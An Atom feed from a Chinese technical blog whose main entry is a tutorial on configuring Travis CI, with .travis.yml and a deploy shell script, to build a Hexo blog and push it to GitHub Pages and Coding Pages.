<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Akkuman Blog</title>
  
  <subtitle>web安全与二进制路上挣扎前行的自留地</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://hacktech.cn/"/>
  <updated>2018-09-08T06:50:11.307Z</updated>
  <id>http://hacktech.cn/</id>
  
  <author>
    <name>Akkuman</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>GTD利器Google Calendar与Hexo博客的结合</title>
    <link href="http://hacktech.cn/2018/09/08/GTD%E5%88%A9%E5%99%A8Google%20Calendar%E4%B8%8EHexo%E5%8D%9A%E5%AE%A2%E7%9A%84%E7%BB%93%E5%90%88.html"/>
    <id>http://hacktech.cn/2018/09/08/GTD利器Google Calendar与Hexo博客的结合.html</id>
    <published>2018-09-07T18:44:25.000Z</published>
    <updated>2018-09-08T06:50:11.307Z</updated>
    
    <content type="html"><![CDATA[<p>等待 <code>hexo-theme-next</code> 主题官方仓库的合并。以后再写，先挖个坑。<br><a id="more"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;等待 &lt;code&gt;hexo-theme-next&lt;/code&gt; 主题官方仓库的合并。以后再写，先挖个坑。&lt;br&gt;
    
    </summary>
    
      <category term="blog" scheme="http://hacktech.cn/categories/blog/"/>
    
    
      <category term="blog" scheme="http://hacktech.cn/tags/blog/"/>
    
  </entry>
  
  <entry>
    <title>使用Travis CI自动部署博客到github pages和coding pages</title>
    <link href="http://hacktech.cn/2018/09/07/use-travis-ci-update-hexo-to-github-and-coding.html"/>
    <id>http://hacktech.cn/2018/09/07/use-travis-ci-update-hexo-to-github-and-coding.html</id>
    <published>2018-09-07T11:25:20.000Z</published>
    <updated>2018-09-08T06:50:11.311Z</updated>
    
    <content type="html"><![CDATA[<p>每次换系统或换电脑之后重新部署博客总是很苦恼？想像jekyll那样，一次性部署完成后，以后本地不用安装环境直接 <code>git push</code> 就能生成博客？那我推荐你应该使用使用 <code>Travis CI</code>了。</p><p>这篇文章我们来讲讲如何利用 <code>Travis CI</code>把你 <code>push</code> 上去的博客源文件直接生成可访问的站点，并且同步部署到 <code>github pages</code> 和 <code>coding pages</code> 。</p><p>这篇文章假设你已经对这些采用 <code>git</code> 版本控制系统的静态博客托管服务有所了解，并且知道怎么去简单的使用 <code>git</code> 以及了解 <code>hexo</code> 写博客发布到这些 <code>pages</code> 服务的流程。因此本文会写的较为<strong>简略，旨在指出关键的地方以及我遇到的问题、问题产生的原因和提供的解决方案</strong>，希望能够帮助到大家。</p><a id="more"></a><p>如果大家有什么问题可以直接在下方评论（独立博客采用Disqus，可能需要翻墙），或者直接给我邮件（<a href="mailto:akkuamns@qq.com" target="_blank" rel="noopener">akkuamns@qq.com</a>），我可能会在以后的时间逐步把详细的流程写出来，时间不多，匆忙之际下笔，望大家见谅。</p><p>看完上面的话，是不是有一种“复恐匆匆说不尽，行人临发又开封。”的感觉，可能废话太多了，那么直接开始吧！</p><h2 id="令牌的获取"><a href="#令牌的获取" class="headerlink" title="令牌的获取"></a>令牌的获取</h2><h3 id="问个为什么"><a href="#问个为什么" class="headerlink" title="问个为什么"></a>问个为什么</h3><p>首先我们说一下为什么要获取令牌？他的作用是什么？</p><p>先给大家几个流程图，来自于<a href="https://liolok.github.io/Hexo-Travis-CI/" target="_blank" rel="noopener">liolok的博客(前两张)</a>和<a href="http://magicse7en.github.io/2016/03/27/travis-ci-auto-deploy-hexo-github/" target="_blank" rel="noopener">CodingLife的博客(第三张)</a></p><p>首先是当我们未采用 <code>Travis CI</code> ，直接使用 <code>hexo</code> 的插件 <code>hexo-deployer-git</code> 执行命令 <code>hexo d -g</code> 部署的流程：</p><p><img src="http://ww1.sinaimg.cn/large/c0264382gy1fv189l6c01j20xh0j9q4c.jpg" alt="liolok的博客-旧流程"></p><p>然后是使用 <code>Travis CI</code> 进行将仓库中的站点源文件自动生成站点然后部署到特定仓库(或特定分支)的流程：</p><p><img src="http://ww1.sinaimg.cn/large/c0264382gy1fv18c106iaj219a0k3q4s.jpg" alt="liolok的博客-新流程"></p><p>还有一张图大家也可以看看：</p><p><img src="http://ww1.sinaimg.cn/large/c0264382gy1fv18deh3foj20tx0sfafg.jpg" alt="TravisCI自动构建hexo博客流程图"></p><p>现在假设一种情况：我们把 <code>username/username.github.io</code> 仓库 <code>clone</code> 了下来，然后在它里面新建了一个分支 <code>hexo</code> 并放置我们的站点源文件（也就是你 <code>hexo init blog</code> 出来的 <code>blog</code> 目录下的所有文件），然后把这个 <code>hexo</code> 分支 <code>push</code> 了上去。</p><p>那么你设置这个仓库到 <code>Travis CI</code> 之后会做什么呢？它会寻找 <code>.travis.yml</code> 这个文件，如果存在的话，它就会根据 <code>.travis.yml</code> 来自动执行一些命令，这些命令就可以完成我们的需求。</p><p>然后我们回到刚才的话题，为什么要获取令牌？</p><p>令牌相当于一个通行证，比如要实现我们的需求，我们的 <code>.travis.yml</code> 中需要把 <code>hexo</code> 分支下的站点源文件文件使用 <code>hexo g</code> 生成静态站点后把这个静态站点 <code>push</code> 到我们的仓库，那 <code>github</code> 总不可能让人想 <code>push</code> 到谁的仓库就可以直接 <code>push</code> 上去吧，所以它就是靠这个通行证来验证你的身份。</p><p>所以我们把令牌的key字段加到 <code>Travis CI</code> 后就可以让 <code>github</code> 知道：哦，这个人是已授权的。</p><h3 id="那么怎么做"><a href="#那么怎么做" class="headerlink" title="那么怎么做"></a>那么怎么做</h3><p>那应该怎么去获取这个令牌并加到  <code>Travis CI</code> 呢？</p><p>哦哦，忘了说一个东西，如果你仔细看了我刚才的描述，那么你可能对这个  <code>Travis CI</code> 还是不了解，只是大致知道了他可以用来做什么，借用一下维基百科上的解释：</p><blockquote><p>Travis CI是在软件开发领域中的一个在线的，分布式的持续集成服务，用来构建及测试在GitHub托管的代码。</p></blockquote><p>你可以把它简单的认为是一个用来 <code>读取你的仓库 -&gt; 读取仓库下的 .travis.yml 文件 -&gt; 根据 .travis.yml 的内容对这个仓库来执行一系列linux和git命令去达到你的目的</code> 的工具。</p><p>那么谈到令牌的获取，这个并不麻烦。</p><p>如果是 <code>github</code>，登陆后打开设置，然后进入 <code>Developer settings -&gt;Personal access tokens</code> 点击 <code>Generate new token</code>，然后会提示你选择这个令牌拥有的权限，因为我们只需要对仓库进行操作，选中 <code>repo</code>即可。</p><p><img src="http://ww1.sinaimg.cn/large/c0264382gy1fv193cmo02j20sy0g1q46.jpg" alt=""></p><p>然后复制那一串 <code>token</code> 先保存下来。</p><p>如果是 <code>coding</code>，打开 <code>个人设置 -&gt; 访问令牌</code>，然后点击 <code>新建令牌</code>，同样的给予仓库的控制权限，然后复制保存生成的 <code>token</code> 。</p><p><img src="http://ww1.sinaimg.cn/large/c0264382gy1fv1978v3jhj20r80cj754.jpg" alt=""></p><p>然后打开<a href="https://travis-ci.org" target="_blank" rel="noopener">Travis CI</a> 网站，然后点击右上角的用github登录，然后同步你的仓库，再打开你需要自动部署的仓库开关，点击设置进去添加 <code>token</code> 即可。直接给两张图。</p><p><img src="http://ww1.sinaimg.cn/large/c0264382gy1fv19ce3p5xj20up0ieq4h.jpg" alt=""></p><p><img src="http://ww1.sinaimg.cn/large/c0264382gy1fv19fuupr5j21hc0u0ad1.jpg" alt=""></p><p>需要注意的是</p><ul><li>每个<code>Token</code> 自定义的 <code>Name</code> 你需要记住，待会在写 <code>.travis.yml</code> 的时候会用到</li><li><code>Display value in build log</code> 这个选项千万不要打开，因为log是公网可见的</li></ul><h2 id="仓库的结构"><a href="#仓库的结构" class="headerlink" title="仓库的结构"></a>仓库的结构</h2><p>上面完成了，我们来说说仓库的结构。</p><ol><li><p>你可以把站点源文件部署到一个新仓库（假如是 <code>new_repo</code>），那么你需要更改一下上面的设置，不是打开博客仓库的开关了，而是换成打开你需要操作的仓库 <code>new_repo</code>的开关，然后  <code>Travis CI</code> 再通过我们设置好的 <code>.travis.yml</code> 自动部署到博客仓库</p></li><li><p>你也可以把站点源文件部署到博客仓库（下文我以 <code>akkuman.github.io</code> 代替）的新分支，然后 <code>Travis CI</code> 再通过这个新分支下我们设置好的 <code>.travis.yml</code> 自动部署到博客仓库 <code>akkuman.github.io</code> 。</p></li></ol><p>这里我们采用第二种方案，只是个人爱好，不想再多开一个仓库。</p><h2 id="仓库的改造"><a href="#仓库的改造" class="headerlink" title="仓库的改造"></a>仓库的改造</h2><h3 id="新分支的建立"><a href="#新分支的建立" class="headerlink" title="新分支的建立"></a>新分支的建立</h3><p>直接看下面的命令和注释吧。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 首先把自己的博客仓库clone到本地</span></span><br><span class="line">git <span class="built_in">clone</span> git@github.com:akkuman/akkuman.github.io.git</span><br><span class="line"><span class="built_in">cd</span> akkuman.github.io.git</span><br><span class="line"><span class="comment"># 我们假设仓库下的部署分支是master</span></span><br><span class="line"><span class="comment"># 我们先新建并切换到一个新分支，分支名我这里取为hexo</span></span><br><span class="line">git checkout -b hexo</span><br></pre></td></tr></table></figure><p>现在我们已经切换到了新分支 <code>hexo</code>，紧接着我们删除 <code>akkuman.github.io</code> 文件夹下除了 <code>.git</code> 文件夹的其他所有文件。</p><p>我们把其他地方 <code>hexo init blog</code> 出来的 <code>blog</code> 站点文件夹下所有文件复制到刚才的 <code>akkuman.github.io</code> 文件夹下。</p><h3 id="站点主题的处理"><a href="#站点主题的处理" class="headerlink" title="站点主题的处理"></a>站点主题的处理</h3><p>这里我们需要注意:<br>不知道你的主题是怎么下载来的，我就分为 1.主题是一个 <code>git</code> 仓库 2.主题不是一个 <code>git</code> 仓库，所以主题可能也是一个 <code>git</code> 仓库，如果你对 <code>git</code> 不熟悉，建议不要 <code>git clone</code> 主题仓库，而是下载别人的 <code>release</code> 版。</p><p>判断一个文件夹是不是 <code>git</code> 仓库，就是看该文件夹目录下有没有一个 <code>.git</code>文件夹，注意它是一个隐藏文件夹，所以你发现你的主题是一个 <code>git</code> 仓库的时候，你可以删除这个隐藏的 <code>.git</code>文件夹。</p><p>那么我们这么做的目的是什么呢？</p><p>如果我们的主题文件夹也是一个 <code>git</code> 仓库，那么我们的这个博客仓库的 <code>hexo</code> 分支下就嵌套了一个仓库，当然，<code>git</code> 也给出了解决方案，那就是子模块。所以目的就是告诉你：图省事可以直接使用非 <code>git</code> 仓库的主题，不用折腾子模块。</p><p>多说一点吧：</p><p>说到子模块，子模块是SSH协议还是HTTPS协议对后面有影响，不过我后面会给一个通用的模板，看后面的注释即可。</p><p>这个子模块你是使用SSH协议还是HTTPS协议就看个人爱好了，我是自己 <code>fork</code> 了别人的仓库然后修改了一下，所以我为了方便期间还是使用了SSH协议的仓库。</p><p>然后子模块怎么使用呢？</p><p>比如我使用的主题仓库是<a href="mailto:`git@github.com" target="_blank" rel="noopener">`git@github.com</a>:akkuman/hexo-theme-next.git<code>，现在假设我们在博客仓库</code>akkuman.github.io<code>下，然后执行下面命令把这个主题仓库下的所有文件复制到站点目录下的</code>themes/next` 文件夹下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git submodule add git@github.com:akkuman/hexo-theme-next.git themes/next</span><br></pre></td></tr></table></figure><p>然后你的目录下会出现一个 <code>.gitmodules</code> 文件，内容格式大致是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[submodule &quot;themes/next&quot;]</span><br><span class="line">path = themes/next</span><br><span class="line">url = git@github.com:akkuman/hexo-theme-next.git</span><br></pre></td></tr></table></figure><p>关于子模块的知识可以自己查阅资料，我这里不细说了，待会在后面我会给出参考资料。</p><h3 id="git需要忽略的文件"><a href="#git需要忽略的文件" class="headerlink" title="git需要忽略的文件"></a>git需要忽略的文件</h3><p><code>git</code> 依靠 <code>.gitignore</code> 文件判断那些文件不纳入仓库，一般通过 <code>hexo init</code> 命令出来的站点文件夹下都会有这么个文件。没有也没关系，自己新建一个 <code>.gitignore</code> 文件，内容为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.DS_Store</span><br><span class="line">Thumbs.db</span><br><span class="line">db.json</span><br><span class="line">*.log</span><br><span class="line">node_modules/</span><br><span class="line">public/</span><br><span class="line">.deploy*/</span><br></pre></td></tr></table></figure><blockquote><p>node_modules目录是hexo博客实例的npm环境依赖,，据说是质量比黑洞还大的物体， 我们选择忽略它， 反正最后到了Travis那里也会重新跑一遍npm install,，这些东西本来也会删了重来, 没有同步的意义.<br>public目录是hexo生成的静态文件， db.json是数据库文件,，同理,，由于Travis构建流程中会执行hexo clean,，都不需要同步。</p></blockquote><h3 id="travis-yml的设置"><a href="#travis-yml的设置" class="headerlink" title=".travis.yml的设置"></a>.travis.yml的设置</h3><p>上面的操作完成后，我们开始着手写 <code>.travis.yml</code>了，先提供一个最简单也是网上博客教程里面最多的版本</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">language:</span> <span class="string">node_js</span> <span class="comment"># 设置语言</span></span><br><span class="line"><span class="attr">node_js:</span> <span class="string">stable</span> <span class="comment"># 设置相应版本</span></span><br><span class="line"><span class="attr">install:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">npm</span> <span class="string">install</span> <span class="comment"># 安装hexo及插件</span></span><br><span class="line"><span class="attr">script:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">hexo</span> <span class="string">clean</span> <span class="comment"># 清除</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">hexo</span> <span class="string">g</span> <span class="comment"># 生成</span></span><br><span class="line"><span class="attr">after_script:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">cd</span> <span class="string">./public</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">git</span> <span class="string">init</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">git</span> <span class="string">config</span> <span class="string">user.name</span> <span class="string">"yourname"</span> <span class="comment"># 修改name</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">git</span> <span class="string">config</span> <span class="string">user.email</span> <span class="string">"your email"</span> <span class="comment"># 修改email</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">git</span> <span class="string">add</span> <span class="string">.</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">git</span> <span class="string">commit</span> <span class="bullet">-m</span> <span class="string">"Travis CI Auto Builder"</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">git</span> <span class="string">push</span> <span class="bullet">--force</span> <span class="bullet">--quiet</span> <span class="string">"https://$&#123;GH_TOKEN&#125;@$&#123;GH_REF&#125;"</span> <span class="attr">master:master</span> <span class="comment"># GH_TOKEN是在Travis中配置token的名称</span></span><br><span class="line"><span class="attr">branches:</span></span><br><span class="line"><span class="attr">    only:</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">hexo</span> <span class="comment">#只监测hexo分支，hexo是我的分支的名称，可根据自己情况设置</span></span><br><span class="line"><span class="attr">env:</span></span><br><span class="line"><span class="attr">    global:</span></span><br><span class="line"><span class="attr">        - GH_REF:</span> <span class="string">github.com/yourname/yourname.github.io.git</span> <span class="comment">#设置GH_REF，注意更改yourname</span></span><br></pre></td></tr></table></figure><p>这个是针对 <code>github</code> 仓库的最简版本，不过有个问题，我们从执行的命令中也能看到，就是部署到 <code>master</code> 分支的站点文件每次都会 <code>init</code> 后在提交，所以每次都只有一次 <code>commit</code> 记录，我建议你把下面的看完。</p><p>我先把文件给出来：</p><p><code>.travis.yml</code> 文件：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">language:</span> <span class="string">node_js</span></span><br><span class="line"></span><br><span class="line"><span class="attr">node_js:</span> <span class="string">stable</span></span><br><span class="line"></span><br><span class="line"><span class="attr">cache:</span></span><br><span class="line"><span class="attr">    apt:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">    directories:</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">node_modules</span></span><br><span class="line"></span><br><span class="line"><span class="attr">notifications:</span></span><br><span class="line"><span class="attr">    email:</span></span><br><span class="line"><span class="attr">        recipients:</span></span><br><span class="line"><span class="bullet">            -</span> <span class="string">akkumans@qq.com</span></span><br><span class="line"><span class="attr">        on_success:</span> <span class="string">change</span></span><br><span class="line"><span class="attr">        on_failure:</span> <span class="string">always</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># turn off the clone of submodules for change the SSH to HTTPS in .gitmodules to avoid the error</span></span><br><span class="line"><span class="attr">git:</span></span><br><span class="line"><span class="attr">  submodules:</span> <span class="literal">false</span></span><br><span class="line">        </span><br><span class="line"><span class="attr">before_install:</span></span><br><span class="line">    <span class="comment"># Use sed to replace the SSH URL with the public URL if .gitmodules exists</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">test</span> <span class="bullet">-e</span> <span class="string">".gitmodules"</span> <span class="string">&amp;&amp;</span> <span class="string">sed</span> <span class="bullet">-i</span> <span class="string">'s/git@github.com:/https:\/\/github.com\//'</span> <span class="string">.gitmodules</span></span><br><span class="line">    <span class="comment"># update the submodule in repo by manual</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">git</span> <span class="string">submodule</span> <span class="string">update</span> <span class="bullet">--init</span> <span class="bullet">--recursive</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">export</span> <span class="string">TZ='Asia/Shanghai'</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">npm</span> <span class="string">install</span> <span class="string">hexo-cli</span> <span class="bullet">-g</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">chmod</span> <span class="string">+x</span> <span class="string">./publish-to-gh-pages.sh</span></span><br><span class="line"></span><br><span class="line"><span class="attr">install:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">npm</span> <span class="string">install</span></span><br><span class="line"></span><br><span class="line"><span class="attr">script:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">hexo</span> <span class="string">clean</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">hexo</span> <span class="string">g</span></span><br><span class="line"></span><br><span class="line"><span class="attr">after_script:</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">./publish-to-gh-pages.sh</span></span><br><span class="line"></span><br><span class="line"><span class="attr">branches:</span></span><br><span class="line"><span class="attr">    only:</span></span><br><span class="line"><span class="bullet">        -</span> <span class="string">hexo</span></span><br><span class="line"></span><br><span class="line"><span class="attr">env:</span></span><br><span class="line"><span class="attr">    global:</span></span><br><span class="line">        <span class="comment"># Github Pages</span></span><br><span class="line"><span class="attr">        - GH_REF:</span> <span class="string">github.com/akkuman/akkuman.github.io.git</span></span><br><span class="line">        <span class="comment"># Coding Pages</span></span><br><span class="line"><span class="attr">        - CD_REF:</span> <span class="string">git.coding.net/Akkuman/Akkuman.git</span></span><br></pre></td></tr></table></figure><p>我把需要执行的脚本放到了 <code>publish-to-gh-pages.sh</code> 文件。</p><p><code>publish-to-gh-pages.sh</code> 文件：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="string">set</span> <span class="bullet">-ev</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># get clone master</span></span><br><span class="line"><span class="string">git</span> <span class="string">clone</span> <span class="attr">https://$&#123;GH_REF&#125;</span> <span class="string">.deploy_git</span></span><br><span class="line"><span class="string">cd</span> <span class="string">.deploy_git</span></span><br><span class="line"><span class="string">git</span> <span class="string">checkout</span> <span class="string">master</span></span><br><span class="line"></span><br><span class="line"><span class="string">cd</span> <span class="string">../</span></span><br><span class="line"><span class="string">mv</span> <span class="string">.deploy_git/.git/</span> <span class="string">./public/</span></span><br><span class="line"></span><br><span class="line"><span class="string">cd</span> <span class="string">./public</span></span><br><span class="line"></span><br><span class="line"><span class="string">git</span> <span class="string">config</span> <span class="string">user.name</span> <span class="string">"Akkuman"</span></span><br><span class="line"><span class="string">git</span> <span class="string">config</span> <span class="string">user.email</span> <span class="string">"akkumans@qq.com"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># add commit timestamp</span></span><br><span class="line"><span class="string">git</span> <span class="string">add</span> <span class="string">.</span></span><br><span class="line"><span class="string">git</span> <span class="string">commit</span> <span class="bullet">-m</span> <span class="string">"Travis CI Auto Builder at `date +"</span><span class="string">%Y-%m-%d</span> <span class="string">%H:%M"`"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Github Pages</span></span><br><span class="line"><span class="string">git</span> <span class="string">push</span> <span class="bullet">--force</span> <span class="bullet">--quiet</span> <span class="string">"https://$&#123;GITHUB_TOKEN&#125;@$&#123;GH_REF&#125;"</span> <span class="attr">master:master</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Coding Pages</span></span><br><span class="line"><span class="string">git</span> <span class="string">push</span> <span class="bullet">--force</span> <span class="bullet">--quiet</span> <span class="string">"https://Akkuman:$&#123;CODING_TOKEN&#125;@$&#123;CD_REF&#125;"</span> <span class="attr">master:master</span></span><br></pre></td></tr></table></figure><p>请把对应的 <code>Akkuman</code> 和 <code>email</code> 还有 <code>username</code> 改成你的配置。</p><p>这里我不详解配置，因为这篇文章已经花了很长时间了，如果大家有需要我再详细写。下面我会给出我的仓库地址，如果有不懂可以去看看我仓库下的例子。</p><p>说着不详解，但是我还是有点自己踩过的坑需要提点一下，<code>Travis CI</code> 进行 <code>git clone</code> 操作的时候，默认是开启 <code>--recursive</code> 参数的，也就是克隆库的时候会默认初始化子模块。这个操作本来是没问题的，那么我为什么要单独提出来说？</p><p>我上面说到了：</p><blockquote><p>说到子模块，子模块是SSH协议还是HTTPS协议对后面有影响</p></blockquote><p>问题就是这里了，如果你是用的HTTPS协议，根据 <code>.gitmodules</code> 文件默认初始化子模块的时候是没问题。但是如果使用SSH协议，不管是 <code>clone</code>、<code>push</code>还是其他等等操作， 是要求本机上有私钥，并且仓库那边要有对应的公钥才可以。但是<code>Travis CI</code> 自动部署执行 <code>clone</code> 的时候没有这个公私钥，所以我们只能使用HTTPS协议，但是我使用的是 <code>.gitmodules</code> 文件里面定义的子模块SSH协议呀！我在这里也查了一下，解决方案就是上面的那样。节选出来：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># turn off the clone of submodules for change the SSH to HTTPS in .gitmodules to avoid the error</span></span><br><span class="line"><span class="attr">git:</span></span><br><span class="line"><span class="attr">  submodules:</span> <span class="literal">false</span></span><br><span class="line">        </span><br><span class="line"><span class="attr">before_install:</span></span><br><span class="line">    <span class="comment"># Use sed to replace the SSH URL with the public URL if .gitmodules exists</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">test</span> <span class="bullet">-e</span> <span class="string">".gitmodules"</span> <span class="string">&amp;&amp;</span> <span class="string">sed</span> <span class="bullet">-i</span> <span class="string">'s/git@github.com:/https:\/\/github.com\//'</span> <span class="string">.gitmodules</span></span><br><span class="line">    <span class="comment"># update the submodule in repo by manual</span></span><br><span class="line"><span class="bullet">    -</span> <span class="string">git</span> <span class="string">submodule</span> <span class="string">update</span> <span class="bullet">--init</span> <span class="bullet">--recursive</span></span><br></pre></td></tr></table></figure><p>先关闭了 <code>Travis CI</code> 的默认初始化子模块功能，然后后面我们先判断子模块配置文件是否存在（所以我刚才说最省事的就是使用 <code>releases</code> 主题，也就是不含 <code>.git</code> 文件夹的，具体见上面），然后判断子模块配置文件如果存在存在，就使用 <code>sed</code> 把命令把 <code>.gitmodules</code> 子模块配置文件中的SSH协议换成HTTPS协议再执行后面的操作。</p><h2 id="开启自动构建之旅"><a href="#开启自动构建之旅" class="headerlink" title="开启自动构建之旅"></a>开启自动构建之旅</h2><p>现在你的博客仓库 <code>akkuman.github.io</code> 文件夹下的 <code>hexo</code> 分支下的东西已经配置好了。</p><p>新分支有了，<code>.travis.yml</code> 文件也有了。</p><p>你现在可以直接 <code>push</code> 上去：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">":constructin_worker: The introduction of Travis CI"</span></span><br><span class="line">git push origin hexo:hexo</span><br></pre></td></tr></table></figure><p>然后打开 <code>Travis CI</code> 网站即可看到你的网站正在构建，如果构建失败，上面也有详细的报错可以帮你分析原因。构建成功后即可看到你焕然一新的网站了。</p><p>以后更新 <code>md</code> 就可以用上面的命令 <code>push</code> 到仓库，然后 <code>Travis CI</code> 会自动帮你构建到 <code>master</code> 分支</p><h3 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h3><p>为了以后不用打</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push origin hexo:hexo</span><br></pre></td></tr></table></figure><p>而是直接可以使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push</span><br></pre></td></tr></table></figure><p>我们可以设置上游分支，如果是第一次执行 <code>git push origin hexo:hexo</code>，它会提示你使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git push --<span class="built_in">set</span>-upstream origin hexo</span><br></pre></td></tr></table></figure><p>使用上面的命令即可把本地的 <code>hexo</code> 的上游分支设置为远程仓库的 <code>hexo</code> 分支，以后 <code>push</code> 就可以简化命令为 <code>git push</code> 了。</p><p>当然你也可以手动设置上游分支，使用下面的命令把本地的 <code>hexo</code> 的上游分支设置为远程仓库的 <code>hexo</code> 分支：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git branch --<span class="built_in">set</span>-upstream-to=origin/hexo hexo</span><br></pre></td></tr></table></figure><h2 id="我的站点仓库配置示例"><a href="#我的站点仓库配置示例" class="headerlink" title="我的站点仓库配置示例"></a>我的站点仓库配置示例</h2><p>见 <a href="https://github.com/akkuman/akkuman.github.io/tree/hexo" target="_blank" rel="noopener">akkuman/akkuman.github.io</a></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://liolok.github.io/Hexo-Travis-CI/" target="_blank" rel="noopener">Hexo + Travis CI 博客管理</a></li><li><a href="http://magicse7en.github.io/2016/03/27/travis-ci-auto-deploy-hexo-github/#坑3：-travis-CI自动构建部署之后，博客页面空白，什么也没有" target="_blank" rel="noopener">使用Travis CI自动构建hexo博客</a></li><li><a href="http://www.itfanr.cc/2017/08/09/using-travis-ci-automatic-deploy-hexo-blogs/#创建-travis-yml-文件" target="_blank" rel="noopener">使用Travis CI自动部署Hexo博客</a></li><li><a href="https://docs.travis-ci.com/user/languages/r/#configuration-options" target="_blank" rel="noopener">Travis CI官方帮助文档</a></li><li><a href="https://blog.csdn.net/guotianqing/article/details/82391665" target="_blank" 